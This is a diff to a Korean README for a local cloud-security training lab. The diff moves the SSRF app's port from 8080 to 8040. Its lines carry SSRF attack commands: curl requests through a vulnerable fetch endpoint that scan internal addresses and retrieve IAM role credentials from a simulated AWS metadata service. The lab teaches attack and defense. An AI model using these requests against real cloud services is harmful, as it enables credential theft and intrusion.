@@ -3,7 +3,7 @@
 > 💡 **교재 및 워게임 연계 안내**:
 > - **연계 교재**: [14장 클라우드 보안 (Cloud Security)](../../14_Cloud_Security/06_cloud_security_ctf_lab.md)
 > - **워게임 트랙**: 워게임 터미널(`wargame/`) `cloud` 트랙 (35개 문제)
-> - **CLI 간편 실행**: `python3 vhack.py lab start 04` (접속: `http://localhost:8080`, `http://localhost:8443`)
+> - **CLI 간편 실행**: `python3 vhack.py lab start 04` (접속: `http://localhost:8040`, `http://localhost:8443`)
 
 이 랩은 클라우드 환경(AWS)과 컨테이너(Docker/Kubernetes)에서 발생하는
 보안 취약점을 실습합니다. SSRF, IMDS 자격증명 탈취, K8s API 인증 취약점,
@@ -15,7 +15,7 @@
 
 | 서비스 | IP | 포트 | 설명 |
 |--------|-----|------|------|
-| ssrf-target | 172.18.0.50 | 8080 | SSRF 취약한 웹 앱 |
+| ssrf-target | 172.18.0.50 | 8040 (컨테이너: 5000) | SSRF 취약한 웹 앱 |
 | metadata-server | 172.18.0.20 | 80 | AWS IMDS 시뮬레이터 |
 | k8s-simulator | 172.18.0.10 | 8443 | 취약한 K8s API 서버 |
 | vulnerable-registry | 172.18.0.30 | 5000 | 인증 없는 컨테이너 레지스트리 |
@@ -23,7 +23,7 @@
 | attacker | 172.18.0.100 | — | 공격 도구 컨테이너 |
 
 **외부 접근:**
-- SSRF 앱: `http://localhost:8080`
+- SSRF 앱: `http://localhost:8040`
 - K8s API: `http://localhost:8443`
 - 레지스트리: `http://localhost:5000`
 
@@ -51,24 +51,24 @@ docker exec -it cloud_lab_attacker bash
 
 ```bash
 # 정상 요청 테스트
-curl "http://localhost:8080/fetch?url=http://example.com"
+curl "http://localhost:8040/fetch?url=http://example.com"
 
 # 내부 네트워크 스캔 (SSRF 활용)
-curl "http://localhost:8080/fetch?url=http://172.18.0.1"
-curl "http://localhost:8080/fetch?url=http://172.18.0.20"
+curl "http://localhost:8040/fetch?url=http://172.18.0.1"
+curl "http://localhost:8040/fetch?url=http://172.18.0.20"
 ```
 
 ### 단계 2: IMDS 접근 (SSRF 활용)
 
 ```bash
 # 메타데이터 루트 접근
-curl "http://localhost:8080/fetch?url=http://172.18.0.20/latest/meta-data/"
+curl "http://localhost:8040/fetch?url=http://172.18.0.20/latest/meta-data/"
 
 # IAM 롤 이름 확인
-curl "http://localhost:8080/fetch?url=http://172.18.0.20/latest/meta-data/iam/security-credentials/"
+curl "http://localhost:8040/fetch?url=http://172.18.0.20/latest/meta-data/iam/security-credentials/"
 
 # 자격증명 탈취 (핵심)
-curl "http://localhost:8080/fetch?url=http://172.18.0.20/latest/meta-data/iam/security-credentials/ec2-prod-role"
+curl "http://localhost:8040/fetch?url=http://172.18.0.20/latest/meta-data/iam/security-credentials/ec2-prod-role"
 ```
 
 ### 단계 3: 탈취한 자격증명으로 AWS 서비스 접근
@@ -288,8 +288,8 @@ rules:
 ## 트러블슈팅
 
 ```bash
-# 메타데이터 서버 직접 테스트
-curl http://localhost:8080/hint
+# SSRF 대상 서버 확인
+curl http://localhost:8040/hint
 
 # K8s 시뮬레이터 확인
 curl http://localhost:8443/version
